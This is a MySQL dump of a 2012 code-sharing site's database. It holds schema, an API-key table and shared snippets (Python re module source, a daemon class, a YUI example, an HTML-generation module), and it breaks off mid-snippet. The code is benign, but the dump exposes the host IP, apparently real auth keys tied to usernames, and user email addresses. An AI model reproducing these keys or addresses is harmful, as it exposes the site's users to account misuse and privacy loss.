-- --------------------------------------------------------
-- Host:                         116.213.146.74
-- Server version:               5.5.24-log - Source distribution
-- Server OS:                    Linux
-- HeidiSQL version:             7.0.0.4160
-- Date/time:                    2012-08-03 10:45:31
-- --------------------------------------------------------

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;

-- Dumping database structure for talkincode_db1
DROP DATABASE IF EXISTS `talkincode_db1`;
CREATE DATABASE IF NOT EXISTS `talkincode_db1` /*!40100 DEFAULT CHARACTER SET utf8 */;
USE `talkincode_db1`;


-- Dumping structure for table talkincode_db1.authkeys
DROP TABLE IF EXISTS `authkeys`;
CREATE TABLE IF NOT EXISTS `authkeys` (
  `authkey` varchar(128) NOT NULL,
  `consumer` varchar(255) NOT NULL,
  `description` varchar(1024) DEFAULT NULL,
  `hits` int(11) NOT NULL DEFAULT '0',
  `create_time` varchar(19) DEFAULT NULL,
  `status` int(1) DEFAULT '1',
  PRIMARY KEY (`authkey`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.authkeys: ~7 rows (approximately)
DELETE FROM `authkeys`;
/*!40000 ALTER TABLE `authkeys` DISABLE KEYS */;
INSERT INTO `authkeys` (`authkey`, `consumer`, `description`, `hits`, `create_time`, `status`) VALUES
	('0640c5ddfb484182921498ab58430042', 'demo', '', 0, '2012-07-11 18:38:46', 1),
	('4e84ce1b8a5247bb8a6179959438b55f', 'pyer', '', 68, '2012-07-12 00:03:37', 1),
	('77151804ad17409383dd322156a77362', 'jimi', '', 1, '2012-07-22 12:33:46', 1),
	('c93892ebe02e4ea1a5b06cab6d1e87ab', 'pren', '', 5, '2012-07-11 18:40:02', 1),
	('cbf4b961d8c0447593bc4083cbc74e85', 'hamain', '', 0, '2012-07-22 15:18:54', 1),
	('d07d60af92a14169afc444f5d5aeb45a', 'jamiesun', '', 21, '2012-07-11 00:09:01', 1),
	('d76231230bc04f57859e1745eb898ca1', 'orange', '', 0, '2012-07-16 20:27:03', 1);
/*!40000 ALTER TABLE `authkeys` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.category
DROP TABLE IF EXISTS `category`;
CREATE TABLE IF NOT EXISTS `category` (
  `id` varchar(32) NOT NULL,
  `parent` varchar(32) NOT NULL,
  `name` varchar(128) NOT NULL,
  `nicename` varchar(255) DEFAULT NULL,
  `description` text,
  PRIMARY KEY (`id`),
  KEY `parent` (`parent`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.category: ~0 rows (approximately)
DELETE FROM `category`;
/*!40000 ALTER TABLE `category` DISABLE KEYS */;
/*!40000 ALTER TABLE `category` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.codes
DROP TABLE IF EXISTS `codes`;
CREATE TABLE IF NOT EXISTS `codes` (
  `id` varchar(32) NOT NULL,
  `parent` varchar(32) DEFAULT NULL,
  `title` varchar(512) DEFAULT NULL,
  `author` varchar(128) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `tags` varchar(255) DEFAULT NULL,
  `content` text,
  `authkey` varchar(128) DEFAULT NULL,
  `lang` varchar(32) DEFAULT NULL,
  `filename` varchar(255) DEFAULT NULL,
  `hits` int(11) DEFAULT '0',
  `recs` int(11) DEFAULT '0',
  `create_time` varchar(32) DEFAULT NULL,
  `via` varchar(32) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.codes: ~30 rows (approximately)
DELETE FROM `codes`;
/*!40000 ALTER TABLE `codes` DISABLE KEYS */;
INSERT INTO `codes` (`id`, `parent`, `title`, `author`, `email`, `tags`, `content`, `authkey`, `lang`, `filename`, `hits`, `recs`, `create_time`, `via`) VALUES
	('03ee12d3ddf64986aefee46f49e33d48', 'None', 'python re module', 'jamiesun', 'jamiesun.net@gmail.com', 'python', '#\n# Secret Labs\' Regular Expression Engine\n#\n# re-compatible interface for the sre matching engine\n#\n# Copyright (c) 1998-2001 by Secret Labs AB.  All rights reserved.\n#\n# This version of the SRE library can be redistributed under CNRI\'s\n# Python 1.6 license.  For any other use, please contact Secret Labs\n# AB (info@pythonware.com).\n#\n# Portions of this engine have been developed in cooperation with\n# CNRI.  Hewlett-Packard provided funding for 1.6 integration and\n# other compatibility work.\n#\n\nr"""Support for regular expressions (RE).\n\nThis module provides regular expression matching operations similar to\nthose found in Perl.  It supports both 8-bit and Unicode strings; both\nthe pattern and the strings being processed can contain null bytes and\ncharacters outside the US ASCII range.\n\nRegular expressions can contain both special and ordinary characters.\nMost ordinary characters, like "A", "a", or "0", are the simplest\nregular expressions; they simply match themselves.  You can\nconcatenate ordinary characters, so last matches the string \'last\'.\n\nThe special characters are:\n    "."      Matches any character except a newline.\n    "^"      Matches the start of the string.\n    "$"      Matches the end of the string or just before the newline at\n             the end of the string.\n    "*"      Matches 0 or more (greedy) repetitions of the preceding RE.\n             Greedy means that it will match as many repetitions as possible.\n    "+"      Matches 1 or more (greedy) repetitions of the preceding RE.\n    "?"      Matches 0 or 1 (greedy) of the preceding RE.\n    *?,+?,?? Non-greedy versions of the previous three special characters.\n    {m,n}    Matches from m to n repetitions of the preceding RE.\n    {m,n}?   Non-greedy version of the above.\n    "\\\\"     Either escapes special characters or signals a special sequence.\n    []       Indicates a set of characters.\n             A "^" as the first character indicates a complementing set.\n    "|"      A|B, creates an RE that will match either A or B.\n    (...)    Matches the RE inside the parentheses.\n             The contents can be retrieved or matched later in the string.\n    (?iLmsux) Set the I, L, M, S, U, or X flag for the RE (see below).\n    (?:...)  Non-grouping version of regular parentheses.\n    (?P<name>...) The substring matched by the group is accessible by name.\n    (?P=name)     Matches the text matched earlier by the group named name.\n    (?#...)  A comment; ignored.\n    (?=...)  Matches if ... matches next, but doesn\'t consume the string.\n    (?!...)  Matches if ... doesn\'t match next.\n    (?<=...) Matches if preceded by ... (must be fixed length).\n    (?<!...) Matches if not preceded by ... (must be fixed length).\n    (?(id/name)yes|no) Matches yes pattern if the group with id/name matched,\n                       the (optional) no pattern otherwise.\n\nThe special sequences consist of "\\\\" and a character from the list\nbelow.  If the ordinary character is not on the list, then the\nresulting RE will match the second character.\n    \\number  Matches the contents of the group of the same number.\n    \\A       Matches only at the start of the string.\n    \\Z       Matches only at the end of the string.\n    \\b       Matches the empty string, but only at the start or end of a word.\n    \\B       Matches the empty string, but not at the start or end of a word.\n    \\d       Matches any decimal digit; equivalent to the set [0-9].\n    \\D       Matches any non-digit character; equivalent to the set [^0-9].\n    \\s       Matches any whitespace character; equivalent to [ \\t\\n\\r\\f\\v].\n    \\S       Matches any non-whitespace character; equiv. to [^ \\t\\n\\r\\f\\v].\n    \\w       Matches any alphanumeric character; equivalent to [a-zA-Z0-9_].\n             With LOCALE, it will match the set [0-9_] plus characters defined\n             as letters for the current locale.\n    \\W       Matches the complement of \\w.\n    \\\\       Matches a literal backslash.\n\nThis module exports the following functions:\n    match    Match a regular expression pattern to the beginning of a string.\n    search   Search a string for the presence of a pattern.\n    sub      Substitute occurrences of a pattern found in a string.\n    subn     Same as sub, but also return the number of substitutions made.\n    split    Split a string by the occurrences of a pattern.\n    findall  Find all occurrences of a pattern in a string.\n    finditer Return an iterator yielding a match object for each match.\n    compile  Compile a pattern into a RegexObject.\n    purge    Clear the regular expression cache.\n    escape   Backslash all non-alphanumerics in a string.\n\nSome of the functions in this module takes flags as optional parameters:\n    I  IGNORECASE  Perform case-insensitive matching.\n    L  LOCALE      Make \\w, \\W, \\b, \\B, dependent on the current locale.\n    M  MULTILINE   "^" matches the beginning of lines (after a newline)\n                   as well as the string.\n                   "$" matches the end of lines (before a newline) as well\n                   as the end of the string.\n    S  DOTALL      "." matches any character at all, including the newline.\n    X  VERBOSE     Ignore whitespace and comments for nicer looking RE\'s.\n    U  UNICODE     Make \\w, \\W, \\b, \\B, dependent on the Unicode locale.\n\nThis module also defines an exception \'error\'.\n\n@description:python re module\n@tags:python,re\n\n"""\n\nimport sys\nimport sre_compile\nimport sre_parse\n\n# public symbols\n__all__ = [ "match", "search", "sub", "subn", "split", "findall",\n    "compile", "purge", "template", "escape", "I", "L", "M", "S", "X",\n    "U", "IGNORECASE", "LOCALE", "MULTILINE", "DOTALL", "VERBOSE",\n    "UNICODE", "error" ]\n\n__version__ = "2.2.1"\n\n# flags\nI = IGNORECASE = sre_compile.SRE_FLAG_IGNORECASE # ignore case\nL = LOCALE = sre_compile.SRE_FLAG_LOCALE # assume current 8-bit locale\nU = UNICODE = sre_compile.SRE_FLAG_UNICODE # assume unicode locale\nM = MULTILINE = sre_compile.SRE_FLAG_MULTILINE # make anchors look for newline\nS = DOTALL = sre_compile.SRE_FLAG_DOTALL # make dot match newline\nX = VERBOSE = sre_compile.SRE_FLAG_VERBOSE # ignore whitespace and comments\n\n# sre extensions (experimental, don\'t rely on these)\nT = TEMPLATE = sre_compile.SRE_FLAG_TEMPLATE # disable backtracking\nDEBUG = sre_compile.SRE_FLAG_DEBUG # dump pattern after compilation\n\n# sre exception\nerror = sre_compile.error\n\n# --------------------------------------------------------------------\n# public interface\n\ndef match(pattern, string, flags=0):\n    """Try to apply the pattern at the start of the string, returning\n    a match object, or None if no match was found."""\n    return _compile(pattern, flags).match(string)\n\ndef search(pattern, string, flags=0):\n    """Scan through string looking for a match to the pattern, returning\n    a match object, or None if no match was found."""\n    return _compile(pattern, flags).search(string)\n\ndef sub(pattern, repl, string, count=0, flags=0):\n    """Return the string obtained by replacing the leftmost\n    non-overlapping occurrences of the pattern in string by the\n    replacement repl.  repl can be either a string or a callable;\n    if a string, backslash escapes in it are processed.  If it is\n    a callable, it\'s passed the match object and must return\n    a replacement string to be used."""\n    return _compile(pattern, flags).sub(repl, string, count)\n\ndef subn(pattern, repl, string, count=0, flags=0):\n    """Return a 2-tuple containing (new_string, number).\n    new_string is the string obtained by replacing the leftmost\n    non-overlapping occurrences of the pattern in the source\n    string by the replacement repl.  number is the number of\n    substitutions that were made. repl can be either a string or a\n    callable; if a string, backslash escapes in it are processed.\n    If it is a callable, it\'s passed the match object and must\n    return a replacement string to be used."""\n    return _compile(pattern, flags).subn(repl, string, count)\n\ndef split(pattern, string, maxsplit=0, flags=0):\n    """Split the source string by the occurrences of the pattern,\n    returning a list containing the resulting substrings."""\n    return _compile(pattern, flags).split(string, maxsplit)\n\ndef findall(pattern, string, flags=0):\n    """Return a list of all non-overlapping matches in the string.\n\n    If one or more groups are present in the pattern, return a\n    list of groups; this will be a list of tuples if the pattern\n    has more than one group.\n\n    Empty matches are included in the result."""\n    return _compile(pattern, flags).findall(string)\n\nif sys.hexversion >= 0x02020000:\n    __all__.append("finditer")\n    def finditer(pattern, string, flags=0):\n        """Return an iterator over all non-overlapping matches in the\n        string.  For each match, the iterator returns a match object.\n\n        Empty matches are included in the result."""\n        return _compile(pattern, flags).finditer(string)\n\ndef compile(pattern, flags=0):\n    "Compile a regular expression pattern, returning a pattern object."\n    return _compile(pattern, flags)\n\ndef purge():\n    "Clear the regular expression cache"\n    _cache.clear()\n    _cache_repl.clear()\n\ndef template(pattern, flags=0):\n    "Compile a template pattern, returning a pattern object"\n    return _compile(pattern, flags|T)\n\n_alphanum = frozenset(\n    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")\n\ndef escape(pattern):\n    "Escape all non-alphanumeric characters in pattern."\n    s = list(pattern)\n    alphanum = _alphanum\n    for i, c in enumerate(pattern):\n        if c not in alphanum:\n            if c == "\\000":\n                s[i] = "\\\\000"\n            else:\n                s[i] = "\\\\" + c\n    return pattern[:0].join(s)\n\n# --------------------------------------------------------------------\n# internals\n\n_cache = {}\n_cache_repl = {}\n\n_pattern_type = type(sre_compile.compile("", 0))\n\n_MAXCACHE = 100\n\ndef _compile(*key):\n    # internal: compile pattern\n    cachekey = (type(key[0]),) + key\n    p = _cache.get(cachekey)\n    if p is not None:\n        return p\n    pattern, flags = key\n    if isinstance(pattern, _pattern_type):\n        if flags:\n            raise ValueError(\'Cannot process flags argument with a compiled pattern\')\n        return pattern\n    if not sre_compile.isstring(pattern):\n        raise TypeError, "first argument must be string or compiled pattern"\n    try:\n        p = sre_compile.compile(pattern, flags)\n    except error, v:\n        raise error, v # invalid expression\n    if len(_cache) >= _MAXCACHE:\n        _cache.clear()\n    _cache[cachekey] = p\n    return p\n\ndef _compile_repl(*key):\n    # internal: compile replacement pattern\n    p = _cache_repl.get(key)\n    if p is not None:\n        return p\n    repl, pattern = key\n    try:\n        p = sre_parse.parse_template(repl, pattern)\n    except error, v:\n        raise error, v # invalid expression\n    if len(_cache_repl) >= _MAXCACHE:\n        _cache_repl.clear()\n    _cache_repl[key] = p\n    return p\n\ndef _expand(pattern, match, template):\n    # internal: match.expand implementation hook\n    template = sre_parse.parse_template(template, pattern)\n    return sre_parse.expand_template(template, match)\n\ndef _subx(pattern, template):\n    # internal: pattern.sub/subn implementation helper\n    template = _compile_repl(template, pattern)\n    if not template[0] and len(template[1]) == 1:\n        # literal replacement\n        return template[1][0]\n    def filter(match, template=template):\n        return sre_parse.expand_template(template, match)\n    return filter\n\n# register myself for pickling\n\nimport copy_reg\n\ndef _pickle(p):\n    return _compile, (p.pattern, p.flags)\n\ncopy_reg.pickle(_pattern_type, _pickle, _compile)\n\n# --------------------------------------------------------------------\n# experimental stuff (see python-dev discussions for details)\n\nclass Scanner:\n    def __init__(self, lexicon, flags=0):\n        from sre_constants import BRANCH, SUBPATTERN\n        self.lexicon = lexicon\n        # combine phrases into a compound pattern\n        p = []\n        s = sre_parse.Pattern()\n        s.flags = flags\n        for phrase, action in lexicon:\n            p.append(sre_parse.SubPattern(s, [\n                (SUBPATTERN, (len(p)+1, sre_parse.parse(phrase, flags))),\n                ]))\n        s.groups = len(p)+1\n        p = sre_parse.SubPattern(s, [(BRANCH, (None, p))])\n        self.scanner = sre_compile.compile(p)\n    def scan(self, string):\n        result = []\n        append = result.append\n        match = self.scanner.scanner(string).match\n        i = 0\n        while 1:\n            m = match()\n            if not m:\n                break\n            j = m.end()\n            if i == j:\n                break\n            action = self.lexicon[m.lastindex-1][1]\n            if hasattr(action, \'__call__\'):\n                self.match = m\n                action = action(self, m.group())\n            if action is not None:\n                append(action)\n            i = j\n        return result, string[i:]\n', 'd07d60af92a14169afc444f5d5aeb45a', 'python', 're.py', 24, 8, '2012-07-11 00:16:31', 'sublime text 2'),
	('0405d921a9d64c82a90b91ee0a98da5d', '0', 'YUI App Framework例子', 'Anonymous', 'Anonymous@talkincode.org', 'yui', '<!DOCTYPE HTML>\r\n<html>\r\n<head>\r\n  <script src="http://yui.yahooapis.com/3.5.1/build/yui/yui-min.js"></script>\r\n</head>\r\n<body class="yui3-skin-sam">\r\n\r\n  <div id="app"></div>\r\n\r\n  <script>\r\n  YUI({\r\n    filter: \'raw\', combine: false\r\n  }).use(\'app\', //\'handlebars\', \'cssbutton\', \r\n    function (Y) {\r\n\r\n    // Creates a HelloView which can say hello to someone named, or to the World\r\n    // if a name is not specified.\r\n    Y.HelloView = Y.Base.create(\'helloView\', Y.View, [], {\r\n        render: function () {\r\n            var name = this.get(\'name\');\r\n            this.get(\'container\').set(\'text\', \'Hello \' + (name || \'World\') + \'!\');\r\n            return this;\r\n        }\r\n    });\r\n\r\n    // Creates a new App instance and registers the HelloView.\r\n    var app = new Y.App({\r\n        serverRouting: false,\r\n        views: {\r\n            hello: {type: \'HelloView\'}\r\n        }\r\n    });\r\n\r\n    // Adds a route handler for "/" to show the HelloView.\r\n    app.route(\'/\', function (req) {\r\n        // Sets the `activeView` to a new instance of a `Y.HelloView` by just\r\n        // passing "hello", the name of the registered view.\r\n        this.showView(\'hello\');\r\n    });\r\n\r\n    // Adds a route handler for "/:name" to show the HelloView with a `name`.\r\n    app.route(\'/:name\', function (req) {\r\n        // The name which we want to say hello to is specified on `req.params`.\r\n        var name = req.params.name;\r\n\r\n        // Sets the `activeView` to a new instance of a `Y.HelloView`, but here\r\n        // we are also passing a config object which the new view instance will\r\n        // be constructed with, and it contains the name which we\'ll say hello to.\r\n        this.showView(\'hello\', {name: name});\r\n    });\r\n\r\n    // Renders the app, then saves a new history entry for "/eric" which will\r\n    // dispatch the "/:name" route handler.\r\n    app.render().save(\'/eric\');\r\n\r\n  });\r\n  </script>\r\n</body>\r\n</html>', NULL, 'javascript', NULL, 14, 7, '2012-07-17 22:58:55', NULL),
	('060bd1270e094713b390fd0bea8f19b5', 'None', '一个python守护进程的例子', 'jamiesun', 'jamiesun.net@gmail.com', 'python', '#! /usr/bin/env python2.7\n#encoding:utf-8\n#@description:一个python守护进程的例子\n#@tags:python,daemon\nimport sys\nimport os\nimport time\nimport atexit\nfrom signal import SIGTERM \n\n\nclass Daemon:\n    """\n    A generic daemon class.\n    \n    Usage: subclass the Daemon class and override the run() method\n    """\n    def __init__(self, pidfile, stdin=\'/dev/null\', stdout=\'/dev/null\', stderr=\'/dev/null\'):\n        self.stdin = stdin\n        self.stdout = stdout\n        self.stderr = stderr\n        self.pidfile = pidfile\n    \n    def daemonize(self):\n        """\n        do the UNIX double-fork magic, see Stevens\' "Advanced \n        Programming in the UNIX Environment" for details (ISBN 0201563177)\n        http://www.erlenstar.demon.co.uk/unix/faq_2.html#SEC16\n        """\n        try: \n            pid = os.fork() \n            if pid > 0:\n                # exit first parent\n                sys.exit(0) \n        except OSError, e: \n            sys.stderr.write("fork #1 failed: %d (%s)\\n" % (e.errno, e.strerror))\n            sys.exit(1)\n    \n        # decouple from parent environment\n        os.chdir("/") \n        os.setsid() \n        os.umask(0) \n    \n        # do second fork\n        try: \n            pid = os.fork() \n            if pid > 0:\n                # exit from second parent\n                sys.exit(0) \n        except OSError, e: \n            sys.stderr.write("fork #2 failed: %d (%s)\\n" % (e.errno, e.strerror))\n            sys.exit(1) \n    \n        # redirect standard file descriptors\n        sys.stdout.flush()\n        sys.stderr.flush()\n        si = file(self.stdin, \'r\')\n        so = file(self.stdout, \'a+\')\n        se = file(self.stderr, \'a+\', 0)\n        os.dup2(si.fileno(), sys.stdin.fileno())\n        os.dup2(so.fileno(), sys.stdout.fileno())\n        os.dup2(se.fileno(), sys.stderr.fileno())\n    \n        # write pidfile\n        atexit.register(self.delpid)\n        pid = str(os.getpid())\n        file(self.pidfile,\'w+\').write("%s\\n" % pid)\n    \n    def delpid(self):\n        os.remove(self.pidfile)\n\n    def start(self):\n        """\n        Start the daemon\n        """\n        # Check for a pidfile to see if the daemon already runs\n        try:\n            pf = file(self.pidfile,\'r\')\n            pid = int(pf.read().strip())\n            pf.close()\n        except IOError:\n            pid = None\n    \n        if pid:\n            message = "pidfile %s already exist. Daemon already running?\\n"\n            sys.stderr.write(message % self.pidfile)\n            sys.exit(1)\n        \n        # Start the daemon\n        self.daemonize()\n        self.run()\n\n    def stop(self):\n        """\n        Stop the daemon\n        """\n        # Get the pid from the pidfile\n        try:\n            pf = file(self.pidfile,\'r\')\n            pid = int(pf.read().strip())\n            pf.close()\n        except IOError:\n            pid = None\n    \n        if not pid:\n            message = "pidfile %s does not exist. Daemon not running?\\n"\n            sys.stderr.write(message % self.pidfile)\n            return # not an error in a restart\n\n        # Try killing the daemon process    \n        try:\n            while 1:\n                os.kill(pid, SIGTERM)\n                time.sleep(0.1)\n        except OSError, err:\n            err = str(err)\n            if err.find("No such process") > 0:\n                if os.path.exists(self.pidfile):\n                    os.remove(self.pidfile)\n            else:\n                print str(err)\n                sys.exit(1)\n\n    def restart(self):\n        """\n        Restart the daemon\n        """\n        self.stop()\n        self.start()\n\n    def run(self):\n        """\n        You should override this method when you subclass Daemon. It will be called after the process has been\n        daemonized by start() or restart().\n        """        \n\n\nclass MyDaemon(Daemon):\n    def run(self):\n        while True:\n            time.sleep(60)\n            print \'daemon runing\'\n\n\n\n\nif __name__ == "__main__":\n    daemon = MyDaemon("/var/run/demodaemon.pid")\n    if len(sys.argv) >= 2:\n        if \'start\' == sys.argv[1]:\n            daemon.start()\n        elif \'stop\' == sys.argv[1]:\n            daemon.stop()\n        elif \'restart\' == sys.argv[1]:\n            daemon.restart()\n        else:\n            print "Unknown command"\n            sys.exit(2)\n        sys.exit(0)\n    else:\n        print "usage: %s start|stop|restart" % sys.argv[0]\n        sys.exit(2)      \n', 'd07d60af92a14169afc444f5d5aeb45a', 'python', 'daemon.py', 48, 6, '2012-07-11 14:59:31', 'sublime text 2'),
	('11f549d8bb5544fd9f48ed265ae145df', '0', '统计代码', 'Anonymous', 'Anonymous@talkincode.org', 'other', '#/usr/bin/python\r\nimport os\r\n\r\n#count the line of a single file\r\ndef CountLine(path):\r\n        tempfile = open(path)\r\n        res = 0\r\n        for lines in tempfile:\r\n                res += 1\r\n        print "%s %d" %(path, res) #output the file path and lines\r\n        return res\r\n\r\n#count the total line of a folder, sub folder included\r\ndef TotalLine(path):\r\n        total = 0\r\n        for root, dirs, files in os.walk(path):\r\n                for item in files:\r\n                        ext = item.split(\'.\')\r\n                        ext = ext[-1]  #get the postfix of the file\r\n                        if(ext in ["cpp", "c", "h", "java", "py", "php"]):\r\n                                subpath = root + "/" + item\r\n                                total += CountLine(subpath)\r\n        return total\r\n\r\nprint "Input Path"\r\npath = raw_input()\r\nprint TotalLine(path)', NULL, 'python', NULL, 22, 6, '2012-07-17 23:55:50', NULL),
	('153331ba96054c1e96a62e67cbc6bfa3', 'None', 'python html转换模块', 'piaoren', 'jamiesun@talkincode.org', 'python,html', '# -*- encoding: utf8 -*-\n#\n# $Id: html.py 5409 2011-06-29 07:07:25Z rjones $\n# $HeadURL: svn+ssh://svn/svn/trunk/api/eklib/html.py $\n#\n\'\'\'Simple, elegant HTML, XHTML and XML generation.\n\nConstructing your HTML\n----------------------\n\nTo construct HTML start with an instance of ``html.HTML()``. Add\ntags by accessing the tag\'s attribute on that object. For example:\n\n>>> from html import HTML\n>>> h = HTML()\n>>> h.p(\'Hello, world!\')\n>>> print h                          # or print(h) in python 3+\n<p>Hello, world!</p>\n\nYou may supply a tag name and some text contents when creating a HTML\ninstance:\n\n>>> h = HTML(\'html\', \'text\')\n>>> print h\n<html>text</html>\n\nYou may also append text content later using the tag\'s ``.text()`` method\nor using augmented addition ``+=``. Any HTML-specific characters (``<>&"``)\nin the text will be escaped for HTML safety as appropriate unless\n``escape=False`` is passed. Each of the following examples uses a new\n``HTML`` instance:\n\n>>> p = h.p(\'hello world!\\\\n\')\n>>> p.br\n>>> p.text(\'more &rarr; text\', escape=False)\n>>> p += \' ... augmented\'\n>>> h.p\n>>> print h\n<p>hello, world!<br>more &rarr; text ... augmented</p>\n<p>\n\nNote also that the top-level ``HTML`` object adds newlines between tags by\ndefault. Finally in the above you\'ll see an empty paragraph tag - tags with\nno contents get no closing tag.\n\nIf the tag should have sub-tags you have two options. You may either add\nthe sub-tags directly on the tag:\n\n>>> l = h.ol\n>>> l.li(\'item 1\')\n>>> l.li.b(\'item 2 > 1\')\n>>> print h\n<ol>\n<li>item 1</li>\n<li><b>item 2 &gt; 1</b></li>\n</ol>\n\nNote that the default behavior with lists (and tables) is to add newlines\nbetween sub-tags to generate a nicer output. You can also see in that\nexample the chaining of tags in ``l.li.b``.\n\nTag attributes may be passed in as well:\n\n>>> t = h.table(border=\'1\')\n>>> for i in range(2):\n>>>   r = t.tr\n>>>   r.td(\'column 1\')\n>>>   r.td(\'column 2\')\n>>> print t\n<table border="1">\n<tr><td>column 1</td><td>column 2</td></tr>\n<tr><td>column 1</td><td>column 2</td></tr>\n</table>\n\nA variation on the above is to use a tag as a context variable. The\nfollowing is functionally identical to the first list construction but\nwith a slightly different sytax emphasising the HTML structure:\n\n>>> with h.ol as l:\n...   l.li(\'item 1\')\n...   l.li.b(\'item 2 > 1\')\n\nYou may turn off/on adding newlines by passing ``newlines=False`` or\n``True`` to the tag (or ``HTML`` instance) at creation time:\n\n>>> l = h.ol(newlines=False)\n>>> l.li(\'item 1\')\n>>> l.li(\'item 2\')\n>>> print h\n<ol><li>item 1</li><li>item 2</li></ol>\n\nSince we can\'t use ``class`` as a keyword, the library recognises ``klass``\nas a substitute:\n\n>>> print h.p(content, klass="styled")\n<p class="styled">content</p>\n\n\nUnicode\n-------\n\n``HTML`` will work with either regular strings **or** unicode strings, but\nnot **both at the same time**.\n\nObtain the final unicode string by calling ``unicode()`` on the ``HTML``\ninstance:\n\n>>> h = HTML()\n>>> h.p(u\'Some Euro: €1.14\')\n>>> unicode(h)\nu\'<p>Some Euro: €1.14</p>\'\n\nIf (under Python 2.x) you add non-unicode strings or attempt to get the\nresultant HTML source through any means other than ``unicode()`` then you\nwill most likely get one of the following errors raised:\n\nUnicodeDecodeError\n   Probably means you\'ve added non-unicode strings to your HTML.\nUnicodeEncodeError\n   Probably means you\'re trying to get the resultant HTML using ``print``\n   or ``str()`` (or ``%s``).\n\n\nHow generation works\n--------------------\n\nThe HTML document is generated when the ``HTML`` instance is "stringified".\nThis could be done either by invoking ``str()`` on it, or just printing it.\nIt may also be returned directly as the "iterable content" from a WSGI app\nfunction.\n\nYou may also render any tag or sub-tag at any time by stringifying it.\n\nTags with no contents (either text or sub-tags) will have no closing tag.\nThere is no "special list" of tags that must always have closing tags, so\nif you need to force a closing tag you\'ll need to provide some content,\neven if it\'s just a single space character.\n\nRendering doesn\'t affect the HTML document\'s state, so you can add to or\notherwise manipulate the HTML after you\'ve stringified it.\n\n\nCreating XHTML\n--------------\n\nTo construct XHTML start with an instance of ``html.XHTML()`` and use it\nas you would an ``HTML`` instance. Empty elements will now be rendered\nwith the appropriate XHTML minimized tag syntax. For example:\n\n>>> from html import XHTML\n>>> h = XHTML()\n>>> h.p\n>>> h.br\n>>> print h\n<p></p>\n<br />\n\n\nCreating XML\n------------\n\nA slight tweak to the ``html.XHTML()`` implementation allows us to generate\narbitrary XML using ``html.XML()``:\n\n>>> from html import XML\n>>> h = XML(\'xml\')\n>>> h.p\n>>> h.br(\'hi there\')\n>>> print h\n<xml>\n<p />\n<br>hi there</br>\n</xml>\n\n\nTags with difficult names\n-------------------------\n\nIf your tag name isn\'t a valid Python identifier name, or if it\'s called\n"text" or "raw_text" you can add your tag slightly more manually:\n\n>>> from html import XML\n>>> h = XML(\'xml\')\n>>> h += XML(\'some-tag\', \'some text\')\n>>> h += XML(\'text\', \'some text\')\n>>> print h\n<xml>\n<some-tag>some text</some-tag>\n<text>some text</text>\n</xml>\n\n\nVersion History (in Brief)\n--------------------------\n\n- 1.16 detect and raise a more useful error when some WSGI frameworks\n  attempt to call HTML.read(). Also added ability to add new content using\n  the += operator.\n- 1.15 fix Python 3 compatibility (unit tests)\n- 1.14 added plain XML support\n- 1.13 allow adding (X)HTML instances (tags) as new document content\n- 1.12 fix handling of XHTML empty tags when generating unicode\n  output (thanks Carsten Eggers)\n- 1.11 remove setuptools dependency\n- 1.10 support plain ol\' distutils again\n- 1.9 added unicode support for Python 2.x\n- 1.8 added Python 3 compatibility\n- 1.7 added Python 2.5 compatibility and escape argument to tag\n  construction\n- 1.6 added .raw_text() and and WSGI compatibility\n- 1.5 added XHTML support\n- 1.3 added more documentation, more tests\n- 1.2 added special-case klass / class attribute\n- 1.1 added escaping control\n- 1.0 was the initial release\n\n----\n\nI would be interested to know whether this module is useful - if you use it\nplease indicate so at https://www.ohloh.net/p/pyhtml\n\nThis code is copyright 2009-2011 eKit.com Inc (http://www.ekit.com/)\nSee the end of the source file for the license of use.\nXHTML support was contributed by Michael Haubenwallner.\n\'\'\'\nfrom __future__ import with_statement\n__version__ = \'1.16\'\n\nimport sys\nimport cgi\nimport unittest\n\n\nclass HTML(object):\n    \'\'\'Easily generate HTML.\n\n    >>> print HTML(\'html\', \'some text\')\n    <html>some text</html>\n    >>> print HTML(\'html\').p(\'some text\')\n    <html><p>some text</p></html>\n\n    If a name is not passed in then the instance becomes a container for\n    other tags that itself generates no tag:\n\n    >>> h = HTML()\n    >>> h.p(\'text\')\n    >>> h.p(\'text\')\n    print h\n    <p>some text</p>\n    <p>some text</p>\n\n    \'\'\'\n    newline_default_on = set(\'table ol ul dl\'.split())\n\n    def __init__(self, name=None, text=None, stack=None, newlines=True,\n            escape=True):\n        self._name = name\n        self._content = []\n        self._attrs = {}\n        # insert newlines between content?\n        if stack is None:\n            stack = [self]\n            self._top = True\n            self._newlines = newlines\n        else:\n            self._top = False\n            self._newlines = name in self.newline_default_on\n        self._stack = stack\n        if text is not None:\n            self.text(text, escape)\n\n    def __getattr__(self, name):\n        # adding a new tag or newline\n        if name == \'newline\':\n            e = \'\\n\'\n        else:\n            e = self.__class__(name, stack=self._stack)\n        if self._top:\n            self._stack[-1]._content.append(e)\n        else:\n            self._content.append(e)\n        return e\n\n    def __iadd__(self, other):\n        if self._top:\n            self._stack[-1]._content.append(other)\n        else:\n            self._content.append(other)\n        return self\n\n    def text(self, text, escape=True):\n        \'\'\'Add text to the document. If "escape" is True any characters\n        special to HTML will be escaped.\n        \'\'\'\n        if escape:\n            text = cgi.escape(text)\n        # adding text\n        if self._top:\n            self._stack[-1]._content.append(text)\n        else:\n            self._content.append(text)\n\n    def raw_text(self, text):\n        \'\'\'Add raw, unescaped text to the document. This is useful for\n        explicitly adding HTML code or entities.\n        \'\'\'\n        return self.text(text, escape=False)\n\n    def __call__(self, *content, **kw):\n        if self._name == \'read\':\n            if len(content) == 1 and isinstance(content[0], int):\n                raise TypeError(\'you appear to be calling read(%d) on \'\n                    \'a HTML instance\' % content)\n            elif len(content) 